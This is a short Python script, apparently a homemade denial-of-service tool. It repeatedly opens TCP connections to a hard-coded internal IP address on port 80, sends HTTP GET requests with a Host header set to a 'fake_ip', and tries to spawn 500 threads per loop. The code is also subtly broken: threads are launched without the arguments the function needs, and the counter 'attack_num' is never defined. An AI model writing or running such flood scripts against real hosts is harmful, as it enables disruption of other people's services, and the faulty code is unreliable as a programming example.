import socket
import threading

##target = '10.135.82.27'
target = '10.83.49.28'
fake_ip = '182.21.20.32'
port = 80

def attack(target, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		
        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()
			
        global attack_num
        attack_num += 1
        print(attack_num)
		
        s.close()


attack(target, port)
